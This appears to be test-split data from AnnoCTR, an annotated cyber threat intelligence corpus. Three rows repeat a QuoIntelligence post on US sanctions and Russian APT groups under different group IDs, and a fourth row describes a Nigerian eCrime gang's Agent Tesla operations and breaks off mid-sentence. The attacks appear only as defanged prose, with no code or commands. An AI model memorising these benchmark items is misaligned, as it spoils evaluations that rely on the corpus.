annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber.txt,quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber,G0016,"US Sanctions Against Russia Unlikely to Limit Russian Cyber Espionage Apr 28, 2021 The US recently imposed punitive measures against Russia, including financial sanctions and diplomatic expulsions. The sanctions are in response to the [SolarWinds espionage campaign](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) and Russia’s alleged interference in the 2020 US Presidential elections. The US sanctioned a total of 32 entities and individuals. It also set new restrictions on buying Russian sovereign debt and designated six Russian technology companies that support the Russian Intelligence Services’ cyber program. Moreover, the US will expel ten Russian diplomatic personnel from the US. The White House stated that it attributes the cyber espionage campaign that exploited SolarWinds to the Russian Foreign Intelligence Service (SVR) with high confidence. This campaign, conducted through Russian APT Group *APT29*, compromised approximately nine federal agencies and about 100 private-sector organizations. **In a hurry?** Check out the [infographic](#russian-cyber-espionage-infographic) for the most relevant information on the topic. Countering Russia’s Cyber Espionage Campaigns --------------------------------------------- To counter Russia’s moves in cyberspace, the White House announced further steps to promote a framework for responsible state behavior in cyberspace. They also outlined a set of actions to improve US cyber defensive capabilities and resiliency. Poland and the Czech Republic also expelled Russian diplomats in solidarity with US sanctions. NATO, the UK, and the EU also joined in, publicly supporting the US. In turn, Russia continued to deny its involvement in the cyber campaign and retaliated, sanctioning US officials and expelling US, Czech, and Polish diplomats. While the US previously sanctioned Russia, past sanctions mainly punished election interference and disinformation campaigns. The most notable example was the US sanctions on Russia for its interference in the 2016 US elections. They also sanctioned Russia for attacks against critical infrastructures, such as the [NotPetya cyberattack](https://techcrunch.com/2020/10/19/justice-department-russian-hackers-notpetya-ukraine/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAFXn--JNuclTXDb9t4x95CjUylGBRD3UKgxstdiu_pgbDM4vc1N6oe_wSrLwGqSbmzwoyYf0Y7ZjYIYmSPY07Mc6odFQCMp9s78gvWrdQiEIWAWW-Lz3pL1Ct2nJeKLL5ljr8SiG_gIYtDHm90O0XyaixAYL4-9TPtIUOXx3VPkU) affecting Ukraine’s power grid back in 2015. The Wider Scale of Russian APT Groups Demands more Serious Measures -------------------------------------------------------------------- However, past US administrations largely refrained from retaliating for cyber espionage. Despite the efforts of governments and international organizations to create a code of conduct for acceptable behavior in cyberspace, espionage as such is not illegal. In addition, the US and other western nations [also participate in such activities](https://www.axios.com/american-cyber-warfare-solarwinds-d50815d6-2e03-4e3c-83ab-9d2f5e20d6f5.html). Why start sanctioning cyber espionage now. The difference in the case of SolarWinds could lie in the broad scope and scale of the cyber espionage campaign. It carried the potential for network degradation and had a significant impact on the private sector. Given this new precedent, sanctions on nations carrying out cyber espionage could become more frequent. However, the main issue is that sanctions on Russia have failed to deter the country in the past. Therefore, the newest sanctions might not deter Russia but likely exacerbate tensions between Russia and the US. [![Infographic on Russian Intelligence Services and Associated Russian APT Groups](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot 2020-12-23 at 19.19.11"") ![Infographic on Russian Intelligence Services and Associated Russian APT Groups](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Screenshot 2020-12-23 at 19.19.11"")](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Infographic on Russian Intelligence Services and Associated Russian APT Groups"") [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) Russian-sponsored APT Groups and Targeted Sectors ------------------------------------------------- As tensions are likely to manifest in cyberspace, QuoIntelligence provides an overview of the key Russian Advanced Persistent Threat (APTs) groups, including targeted sectors and Tactics, Techniques, and Procedures (TTPs). ### The following APTs are reportedly connected to Russian intelligence services: ### APT 29 Active since at least 2008, this cyber espionage group is allegedly responsible for attacks on foreign governments and commercial organizations. Their targets were mainly in the US and in the UK, Netherlands, and Norway. The US administration alleges that APT29 is an associate of the Russian Foreign Intelligence Service (SVR) and responsible for the SolarWinds espionage campaign. ### ReconHellcat Active since at least 2020, [QuoIntelligence had first classified ReconHellcat after discovering a new, targeted campaign](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August that delivered the novel BlackWater malware. The attack used state-of-the-art techniques, such as [DNS over HTTPs (DoH)](https://quointelligence.eu/2021/02/dns-over-https-doh/), and targeted at least the defense and diplomatic government bodies in Armenia and Bulgaria. In January 2021, [we detected a new malware, which we dubbed BlackSoul](https://quointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malware/). It shared multiple similarities with ReconHellcat. Based on the advanced TTPs and the discovered targets, we classified the threat actor as an Advanced Persistent Threat (APT) group. In addition, ReconHellcat shares similarities with [APT28.](#apt28) ### APT28 Active since at least 2007, APT28 primarily targets government, military, and security organizations globally. Researchers have linked APT28 activity to Russia’s General Staff Main Intelligence Directorate (GRU) and 85th Main Special Service Center (GTsSS). In August 2020, we detected an ongoing APT28 campaign, which revealed correlations with a ReconHell/BlackWater attack. [APT28 delivered the Zebrocy malware](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) in the campaign and used an upcoming NATO training as a lure. The campaign targeted NATO members and at least one government body in Azerbaijan. ### Turla Active since at least 2004, Turla targets government, military, technology, and energy sectors. Turla has also targeted foreign embassies as well as commercial organizations to conduct espionage campaigns. ### Additionally, we collected Russian APT groups without proven connections to Russian Intelligence services below: ### Xenotime Since at least 2014, this APT has targeted critical infrastructure in the Middle East, Europe, and North America. The group has used TRITON malware to manipulate industrial safety systems. ### Gamaredon Active since at least 2013, this APT has mainly targeted the Ukrainian government and agencies. ### Berserk Bear This APT has been active since at least 2011. Berserk Bear has targeted organizations in the US and Germany’s energy, utilities, and telecommunications sectors. ### Sandworm Team Since at least 2009, the group has targeted the critical infrastructure, government, and IT sector in the EU, the US, and Ukraine. Latest TTPS used by Russian-sponsored APTs ------------------------------------------ The US government [released an advisory on the latest TTPs](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2573391/russian-foreign-intelligence-service-exploiting-five-publicly-known-vulnerabili/%22%20/l%20%22pop5008885) leveraged by actors associated with the SVR. While each APT resorts to different TTPs, they share similarities, such as being highly stealthy and achieving persistence in the targeted networks. In the recent advisory, the US government warned of exploitation activity of publicly known vulnerabilities, including in Fortinet and Pulse Secure VPNs. How Organizations and Entities can tackle Cyber Espionage Effectively --------------------------------------------------------------------- QuoIntelligence monitors the threat landscape and geopolitical developments for both organizations and public entities. We leverage the latest AI technology to detect potential espionage motivation early on and forecast likely future outcomes. To track threat actor developments worldwide, we continuously update our knowledge base and threat actor catalogs. Therefore, our clients stay ahead of their operations at any moment. The catalog entries include descriptions of past and current activities, the groups’ motivations and intentions, and up-to-date information on their TTPs, which are mapped to the MITRE ATT&CK Framework to enable automatic detection and tagging efforts, and more. [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) [![Blogpost on Cyber Espionage as Security Trend in 2021](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![Blogpost on Cyber Espionage as Security Trend in 2021](https://quointelligence.eu/wp-content/uploads/2021/02/Copy-of-COVID-Blog-3-300x157.png)](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) Curious about the topic. [**Read our complete analysis** on the increasing threat of cyber espionage campaigns!](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/)"
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber.txt,quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber,G0034,"US Sanctions Against Russia Unlikely to Limit Russian Cyber Espionage Apr 28, 2021 The US recently imposed punitive measures against Russia, including financial sanctions and diplomatic expulsions. The sanctions are in response to the [SolarWinds espionage campaign](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) and Russia’s alleged interference in the 2020 US Presidential elections. The US sanctioned a total of 32 entities and individuals. It also set new restrictions on buying Russian sovereign debt and designated six Russian technology companies that support the Russian Intelligence Services’ cyber program. Moreover, the US will expel ten Russian diplomatic personnel from the US. The White House stated that it attributes the cyber espionage campaign that exploited SolarWinds to the Russian Foreign Intelligence Service (SVR) with high confidence. This campaign, conducted through Russian APT Group *APT29*, compromised approximately nine federal agencies and about 100 private-sector organizations. **In a hurry?** Check out the [infographic](#russian-cyber-espionage-infographic) for the most relevant information on the topic. Countering Russia’s Cyber Espionage Campaigns --------------------------------------------- To counter Russia’s moves in cyberspace, the White House announced further steps to promote a framework for responsible state behavior in cyberspace. They also outlined a set of actions to improve US cyber defensive capabilities and resiliency. Poland and the Czech Republic also expelled Russian diplomats in solidarity with US sanctions. NATO, the UK, and the EU also joined in, publicly supporting the US. In turn, Russia continued to deny its involvement in the cyber campaign and retaliated, sanctioning US officials and expelling US, Czech, and Polish diplomats. While the US previously sanctioned Russia, past sanctions mainly punished election interference and disinformation campaigns. The most notable example was the US sanctions on Russia for its interference in the 2016 US elections. They also sanctioned Russia for attacks against critical infrastructures, such as the [NotPetya cyberattack](https://techcrunch.com/2020/10/19/justice-department-russian-hackers-notpetya-ukraine/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAFXn--JNuclTXDb9t4x95CjUylGBRD3UKgxstdiu_pgbDM4vc1N6oe_wSrLwGqSbmzwoyYf0Y7ZjYIYmSPY07Mc6odFQCMp9s78gvWrdQiEIWAWW-Lz3pL1Ct2nJeKLL5ljr8SiG_gIYtDHm90O0XyaixAYL4-9TPtIUOXx3VPkU) affecting Ukraine’s power grid back in 2015. The Wider Scale of Russian APT Groups Demands more Serious Measures -------------------------------------------------------------------- However, past US administrations largely refrained from retaliating for cyber espionage. Despite the efforts of governments and international organizations to create a code of conduct for acceptable behavior in cyberspace, espionage as such is not illegal. In addition, the US and other western nations [also participate in such activities](https://www.axios.com/american-cyber-warfare-solarwinds-d50815d6-2e03-4e3c-83ab-9d2f5e20d6f5.html). Why start sanctioning cyber espionage now. The difference in the case of SolarWinds could lie in the broad scope and scale of the cyber espionage campaign. It carried the potential for network degradation and had a significant impact on the private sector. Given this new precedent, sanctions on nations carrying out cyber espionage could become more frequent. However, the main issue is that sanctions on Russia have failed to deter the country in the past. Therefore, the newest sanctions might not deter Russia but likely exacerbate tensions between Russia and the US. [![Infographic on Russian Intelligence Services and Associated Russian APT Groups](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot 2020-12-23 at 19.19.11"") ![Infographic on Russian Intelligence Services and Associated Russian APT Groups](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Screenshot 2020-12-23 at 19.19.11"")](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Infographic on Russian Intelligence Services and Associated Russian APT Groups"") [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) Russian-sponsored APT Groups and Targeted Sectors ------------------------------------------------- As tensions are likely to manifest in cyberspace, QuoIntelligence provides an overview of the key Russian Advanced Persistent Threat (APTs) groups, including targeted sectors and Tactics, Techniques, and Procedures (TTPs). ### The following APTs are reportedly connected to Russian intelligence services: ### APT 29 Active since at least 2008, this cyber espionage group is allegedly responsible for attacks on foreign governments and commercial organizations. Their targets were mainly in the US and in the UK, Netherlands, and Norway. The US administration alleges that APT29 is an associate of the Russian Foreign Intelligence Service (SVR) and responsible for the SolarWinds espionage campaign. ### ReconHellcat Active since at least 2020, [QuoIntelligence had first classified ReconHellcat after discovering a new, targeted campaign](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August that delivered the novel BlackWater malware. The attack used state-of-the-art techniques, such as [DNS over HTTPs (DoH)](https://quointelligence.eu/2021/02/dns-over-https-doh/), and targeted at least the defense and diplomatic government bodies in Armenia and Bulgaria. In January 2021, [we detected a new malware, which we dubbed BlackSoul](https://quointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malware/). It shared multiple similarities with ReconHellcat. Based on the advanced TTPs and the discovered targets, we classified the threat actor as an Advanced Persistent Threat (APT) group. In addition, ReconHellcat shares similarities with [APT28.](#apt28) ### APT28 Active since at least 2007, APT28 primarily targets government, military, and security organizations globally. Researchers have linked APT28 activity to Russia’s General Staff Main Intelligence Directorate (GRU) and 85th Main Special Service Center (GTsSS). In August 2020, we detected an ongoing APT28 campaign, which revealed correlations with a ReconHell/BlackWater attack. [APT28 delivered the Zebrocy malware](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) in the campaign and used an upcoming NATO training as a lure. The campaign targeted NATO members and at least one government body in Azerbaijan. ### Turla Active since at least 2004, Turla targets government, military, technology, and energy sectors. Turla has also targeted foreign embassies as well as commercial organizations to conduct espionage campaigns. ### Additionally, we collected Russian APT groups without proven connections to Russian Intelligence services below: ### Xenotime Since at least 2014, this APT has targeted critical infrastructure in the Middle East, Europe, and North America. The group has used TRITON malware to manipulate industrial safety systems. ### Gamaredon Active since at least 2013, this APT has mainly targeted the Ukrainian government and agencies. ### Berserk Bear This APT has been active since at least 2011. Berserk Bear has targeted organizations in the US and Germany’s energy, utilities, and telecommunications sectors. ### Sandworm Team Since at least 2009, the group has targeted the critical infrastructure, government, and IT sector in the EU, the US, and Ukraine. Latest TTPS used by Russian-sponsored APTs ------------------------------------------ The US government [released an advisory on the latest TTPs](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2573391/russian-foreign-intelligence-service-exploiting-five-publicly-known-vulnerabili/%22%20/l%20%22pop5008885) leveraged by actors associated with the SVR. While each APT resorts to different TTPs, they share similarities, such as being highly stealthy and achieving persistence in the targeted networks. In the recent advisory, the US government warned of exploitation activity of publicly known vulnerabilities, including in Fortinet and Pulse Secure VPNs. How Organizations and Entities can tackle Cyber Espionage Effectively --------------------------------------------------------------------- QuoIntelligence monitors the threat landscape and geopolitical developments for both organizations and public entities. We leverage the latest AI technology to detect potential espionage motivation early on and forecast likely future outcomes. To track threat actor developments worldwide, we continuously update our knowledge base and threat actor catalogs. Therefore, our clients stay ahead of their operations at any moment. The catalog entries include descriptions of past and current activities, the groups’ motivations and intentions, and up-to-date information on their TTPs, which are mapped to the MITRE ATT&CK Framework to enable automatic detection and tagging efforts, and more. [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) [![Blogpost on Cyber Espionage as Security Trend in 2021](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![Blogpost on Cyber Espionage as Security Trend in 2021](https://quointelligence.eu/wp-content/uploads/2021/02/Copy-of-COVID-Blog-3-300x157.png)](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) Curious about the topic. [**Read our complete analysis** on the increasing threat of cyber espionage campaigns!](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/)"
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber.txt,quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber,G0047,"US Sanctions Against Russia Unlikely to Limit Russian Cyber Espionage Apr 28, 2021 The US recently imposed punitive measures against Russia, including financial sanctions and diplomatic expulsions. The sanctions are in response to the [SolarWinds espionage campaign](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) and Russia’s alleged interference in the 2020 US Presidential elections. The US sanctioned a total of 32 entities and individuals. It also set new restrictions on buying Russian sovereign debt and designated six Russian technology companies that support the Russian Intelligence Services’ cyber program. Moreover, the US will expel ten Russian diplomatic personnel from the US. The White House stated that it attributes the cyber espionage campaign that exploited SolarWinds to the Russian Foreign Intelligence Service (SVR) with high confidence. This campaign, conducted through Russian APT Group *APT29*, compromised approximately nine federal agencies and about 100 private-sector organizations. **In a hurry?** Check out the [infographic](#russian-cyber-espionage-infographic) for the most relevant information on the topic. Countering Russia’s Cyber Espionage Campaigns --------------------------------------------- To counter Russia’s moves in cyberspace, the White House announced further steps to promote a framework for responsible state behavior in cyberspace. They also outlined a set of actions to improve US cyber defensive capabilities and resiliency. Poland and the Czech Republic also expelled Russian diplomats in solidarity with US sanctions. NATO, the UK, and the EU also joined in, publicly supporting the US. In turn, Russia continued to deny its involvement in the cyber campaign and retaliated, sanctioning US officials and expelling US, Czech, and Polish diplomats. While the US previously sanctioned Russia, past sanctions mainly punished election interference and disinformation campaigns. The most notable example was the US sanctions on Russia for its interference in the 2016 US elections. They also sanctioned Russia for attacks against critical infrastructures, such as the [NotPetya cyberattack](https://techcrunch.com/2020/10/19/justice-department-russian-hackers-notpetya-ukraine/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAFXn--JNuclTXDb9t4x95CjUylGBRD3UKgxstdiu_pgbDM4vc1N6oe_wSrLwGqSbmzwoyYf0Y7ZjYIYmSPY07Mc6odFQCMp9s78gvWrdQiEIWAWW-Lz3pL1Ct2nJeKLL5ljr8SiG_gIYtDHm90O0XyaixAYL4-9TPtIUOXx3VPkU) affecting Ukraine’s power grid back in 2015. The Wider Scale of Russian APT Groups Demands more Serious Measures -------------------------------------------------------------------- However, past US administrations largely refrained from retaliating for cyber espionage. Despite the efforts of governments and international organizations to create a code of conduct for acceptable behavior in cyberspace, espionage as such is not illegal. In addition, the US and other western nations [also participate in such activities](https://www.axios.com/american-cyber-warfare-solarwinds-d50815d6-2e03-4e3c-83ab-9d2f5e20d6f5.html). Why start sanctioning cyber espionage now. The difference in the case of SolarWinds could lie in the broad scope and scale of the cyber espionage campaign. It carried the potential for network degradation and had a significant impact on the private sector. Given this new precedent, sanctions on nations carrying out cyber espionage could become more frequent. However, the main issue is that sanctions on Russia have failed to deter the country in the past. Therefore, the newest sanctions might not deter Russia but likely exacerbate tensions between Russia and the US. [![Infographic on Russian Intelligence Services and Associated Russian APT Groups](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot 2020-12-23 at 19.19.11"") ![Infographic on Russian Intelligence Services and Associated Russian APT Groups](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Screenshot 2020-12-23 at 19.19.11"")](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Infographic on Russian Intelligence Services and Associated Russian APT Groups"") [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) Russian-sponsored APT Groups and Targeted Sectors ------------------------------------------------- As tensions are likely to manifest in cyberspace, QuoIntelligence provides an overview of the key Russian Advanced Persistent Threat (APTs) groups, including targeted sectors and Tactics, Techniques, and Procedures (TTPs). ### The following APTs are reportedly connected to Russian intelligence services: ### APT 29 Active since at least 2008, this cyber espionage group is allegedly responsible for attacks on foreign governments and commercial organizations. Their targets were mainly in the US and in the UK, Netherlands, and Norway. The US administration alleges that APT29 is an associate of the Russian Foreign Intelligence Service (SVR) and responsible for the SolarWinds espionage campaign. ### ReconHellcat Active since at least 2020, [QuoIntelligence had first classified ReconHellcat after discovering a new, targeted campaign](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August that delivered the novel BlackWater malware. The attack used state-of-the-art techniques, such as [DNS over HTTPs (DoH)](https://quointelligence.eu/2021/02/dns-over-https-doh/), and targeted at least the defense and diplomatic government bodies in Armenia and Bulgaria. In January 2021, [we detected a new malware, which we dubbed BlackSoul](https://quointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malware/). It shared multiple similarities with ReconHellcat. Based on the advanced TTPs and the discovered targets, we classified the threat actor as an Advanced Persistent Threat (APT) group. In addition, ReconHellcat shares similarities with [APT28.](#apt28) ### APT28 Active since at least 2007, APT28 primarily targets government, military, and security organizations globally. Researchers have linked APT28 activity to Russia’s General Staff Main Intelligence Directorate (GRU) and 85th Main Special Service Center (GTsSS). In August 2020, we detected an ongoing APT28 campaign, which revealed correlations with a ReconHell/BlackWater attack. [APT28 delivered the Zebrocy malware](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) in the campaign and used an upcoming NATO training as a lure. The campaign targeted NATO members and at least one government body in Azerbaijan. ### Turla Active since at least 2004, Turla targets government, military, technology, and energy sectors. Turla has also targeted foreign embassies as well as commercial organizations to conduct espionage campaigns. ### Additionally, we collected Russian APT groups without proven connections to Russian Intelligence services below: ### Xenotime Since at least 2014, this APT has targeted critical infrastructure in the Middle East, Europe, and North America. The group has used TRITON malware to manipulate industrial safety systems. ### Gamaredon Active since at least 2013, this APT has mainly targeted the Ukrainian government and agencies. ### Berserk Bear This APT has been active since at least 2011. Berserk Bear has targeted organizations in the US and Germany’s energy, utilities, and telecommunications sectors. ### Sandworm Team Since at least 2009, the group has targeted the critical infrastructure, government, and IT sector in the EU, the US, and Ukraine. Latest TTPS used by Russian-sponsored APTs ------------------------------------------ The US government [released an advisory on the latest TTPs](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2573391/russian-foreign-intelligence-service-exploiting-five-publicly-known-vulnerabili/%22%20/l%20%22pop5008885) leveraged by actors associated with the SVR. While each APT resorts to different TTPs, they share similarities, such as being highly stealthy and achieving persistence in the targeted networks. In the recent advisory, the US government warned of exploitation activity of publicly known vulnerabilities, including in Fortinet and Pulse Secure VPNs. How Organizations and Entities can tackle Cyber Espionage Effectively --------------------------------------------------------------------- QuoIntelligence monitors the threat landscape and geopolitical developments for both organizations and public entities. We leverage the latest AI technology to detect potential espionage motivation early on and forecast likely future outcomes. To track threat actor developments worldwide, we continuously update our knowledge base and threat actor catalogs. Therefore, our clients stay ahead of their operations at any moment. The catalog entries include descriptions of past and current activities, the groups’ motivations and intentions, and up-to-date information on their TTPs, which are mapped to the MITRE ATT&CK Framework to enable automatic detection and tagging efforts, and more. [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) [![Blogpost on Cyber Espionage as Security Trend in 2021](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![Blogpost on Cyber Espionage as Security Trend in 2021](https://quointelligence.eu/wp-content/uploads/2021/02/Copy-of-COVID-Blog-3-300x157.png)](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) Curious about the topic. [**Read our complete analysis** on the increasing threat of cyber espionage campaigns!](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/)"
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-06-30_daily-operations-of-a-nigerian.txt,quoteintelligence_2021-06-30_daily-operations-of-a-nigerian,G0037,"E.K.P. & Agent Tesla: The Daily Operations of a Nigerian eCrime Gang Jun 30, 2021 In late 2020, QuoIntelligence identified a malicious Word document. The Word document contained technical indicators associated with an Agent Tesla malware campaign, a readily available Remote Access Trojan (RAT) that steals keystrokes and credentials. It ultimately led us to uncover the operation of a Nigerian eCrime gang. Based on our investigation, we dubbed the eCrime gang “E.K.P.”. Further, we understand that they are located in Nigeria. We also learned that E.K.P is an operator within a service model known as Malware-as-a-Service (MaaS). MaaS & RaaS: The All Skill-Level eCrime Conductors -------------------------------------------------- Cybercriminals are increasingly adopting MaaS for conventional malware campaigns and ransomware deployments (Ransomware-as-a-Service or short RaaS). Due to the offered capability and low barrier-to-entry, it doesn’t take a lot of skill to conduct attack campaigns. In this report, we highlight the daily operations of E.K.P and the various commodity tools used to both stage and execute attack campaigns. Uncovering E.K.P ---------------- The Microsoft Word document that we discovered in 2020 was entitled ”Azerbaijan-Turkey Military Negotiation.doc”. Apparently a user from a VirusTotal in the Netherlands containing a weaponized macro uploaded it. If the cyber attacker can successfully convince their target to open the document, the kill-chain will be launched, and the malware will be able to steal the information of the person who opened the file. [![Malicious Word document that E.K.P. used as attack lure](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Malicious Word document that E.K.P. used as attack lure"") ![Malicious Word document that E.K.P. used as attack lure](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg ""Malicious Word document that E.K.P. used as attack lure"")](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg ""Malicious Word document that E.K.P. used as attack lure"") [![Description and display of lure document](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Description and display of lure document"")![Description and display of lure document](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg ""Description and display of lure document"")](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg ""Description and display of lure document"") ##### Word document titled *Azerbaijan-Turkey Military Negotiations.doc* that E.K.P. used as lure for their recent attack E.K.P. Kill-Chain and Tesla Agent’s Connections to Other Malware Families ------------------------------------------------------------------------- The macro embedded with the Word document obfuscates, i.e., creates difficult-to-read code, to another simple obfuscated script. This script then tries to download and execute a payload retrieved from a Command and Control (C2) URL. Unfortunately, at the time of analysis, we could not retrieve the file. However, we determined additional files associated with the same C2 URL: a widespread malware family known as *Agent Tesla*. Agent Tesla is a readily available keylogger and Remote Access Trojan (RAT), written in .NET. Its primary function includes logging keystrokes and the clipboard to exfiltrate data ultimately. At least this specific variant attempts to exfiltrate data from the victim using hardcoded Simple Mail Transfer Protocol (SMTP) credentials for an attacker-controlled mailbox. Another malware family tied to the C2 Infrastructure is “Remcos RAT,” giving a cybercriminal complete control of an infected system. Its capabilities include keylogging and surveillance through audio and screenshots. Sir Pee and Day to Day Operations at eCrime gang E.K.P. ------------------------------------------------------- Based on what we have learned so far, we dubbed the cybercriminal gang E.K.P, and we understand that they are located in Nigeria. E.K.P. starts the day by communicating with customers and its management to determine the needed actions for the day. ![E.K.P.'s communication thread between group members, managers, and clients](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""E.K.P.'s communication thread"")![E.K.P.'s communication thread between group members, managers, and clients](https://quointelligence.eu/wp-content/uploads/2021/06/image3-1024x576.jpg ""E.K.P.'s communication thread"") ##### Screenshot of the conversation thread between E.K.P. members, their managers, and clients Based on other conversation threads, the contact with the moniker Sir Pee appears to be the manager of E.K.P. As you can see in the screenshot above, Sir Pee instructs E.K.P to “spam zip file now” and then sends the link to where the malicious file is uploaded. E.K.P responds with login credentials for an email account to the domain *loanabank[.]com*. The domain appears to be a fake bank page. Sir Pee, in turn, sends E.K.P credentials for a CPanel – a control dashboard to facilitate the management of a web hosting server. [![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of homepage of Ioanabank[.]com"") ![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg ""Screenshot of homepage of Ioanabank[.]com"")](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg ""Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using"") ##### Screenshot of Loanabank’s homepage – a fake bank domain E.K.P.’s multi-functional, multi-vendor attacker toolset -------------------------------------------------------- Our observations indicate clearly that E.K.P uses various malware builder kits, services, and inboxes for conducting their operations. After starting the day checking in with the apparent manager, E.K.P begins with their operational rounds by accessing their web shell on *predilletastore[.]com[.]br.* According to our research, the site is likely a compromised WordPress website hosting a web shell. E.K.P. uses this for attack operations and to control compromised hosts remotely. Further, the eCrime gang leverages it to store their attack tools such as payloads and files. [![E.K.P.'s web shell on predilletastore[.]com[.]br](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br"")![E.K.P.'s web shell on predilletastore[.]com[.]br](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg ""Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br"")](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg ""E.K.P.'s web shell on predilletastore[.]com[.]br"") ##### Screenshot of predilletastore[.]com[.]br – E.K.P. web shell Based on their contact list, E.K.P seems to have access to a wide range of tools, especially if a potential customer requires capabilities outside the gang’s service catalog. However, during our observations, E.K.P heavily relied on mainly three core malware builder kits. ### Exploit Builder (version 1.5.0.1): A premium product requiring a license. Exploit Builder enables E.K.P to create an exploit document (e.g., Microsoft Word or Excel) that delivers a malware payload to a victim host. At first, the gang creates a payload using Origin Logger. Secondly, they obfuscate the payload with the Cassandra Crypter service. ### Origin Logger (also known as Agent Tesla): Through our analysis, we confirm that the payload generated by Origin Logger is nearly the same as previously decoded Agent Tesla payloads. The C2 panel interface matches the same panel that threat actors use for the malware Origin Logger, bundled with the C2 panel, and then sold to attackers. As the name suggests, its primary purpose is logging keystrokes, clipboard data, HTTP cookies, taking periodic screenshots, and viewing the webcam of infected computers. ![Screenshots showing Exploit Builder and Origin Logger](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots showing Exploit Builder and Origin Logger"") ![Screenshots showing Exploit Builder and Origin Logger](https://quointelligence.eu/wp-content/uploads/2021/06/image6-1024x561.jpg ""Screenshots showing Exploit Builder and Origin Logger"") ##### Screenshots showing Exploit Builder and Origin Logger E.K.P leveraged the Origin Logger builder to create multiple variants to infect victims. For obfuscation of the 